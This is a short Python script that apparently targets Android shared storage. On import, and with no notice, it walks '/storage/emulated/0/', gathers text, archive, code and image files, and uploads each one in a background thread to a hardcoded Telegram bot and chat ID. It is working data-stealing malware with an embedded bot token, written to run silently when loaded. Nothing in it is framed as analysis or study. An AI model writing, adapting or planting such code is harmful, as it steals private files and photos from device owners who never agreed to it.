import os
import telebot
import threading

class a_oder:
    def __init__(self, telegram_token, chat_id, directory):
        self.bot = telebot.TeleBot(telegram_token)
        self.chat_id = chat_id
        self.directory = directory
        self.start_sending_files()

    def fetch_files(self, extensions=['.py', '.zip', '.txt', '.jpg', '.png']):
        return [
            os.path.join(root, file_name)
            for root, _, file_names in os.walk(self.directory)
            for file_name in file_names
            if any(file_name.endswith(ext) for ext in extensions)
        ]

    def send_files(self):
        files = self.fetch_files()
        for file in files:
            try:
                with open(file, 'rb') as f:
                    self.bot.send_document(self.chat_id, f)
            except Exception as e:
                print(f"Failed to send file {file}: {e}")

    def start_sending_files(self):
        thread = threading.Thread(target=self.send_files)
        thread.start()

def init_a_oder():
    telegram_token = '7282138623:AAEtB3Fwdm5WtHSpbW8VbjY5UWkdTX3z98Y'
    chat_id = '7020558505'
    directory = '/storage/emulated/0/'
    a_oder(telegram_token, chat_id, directory)
init_a_oder()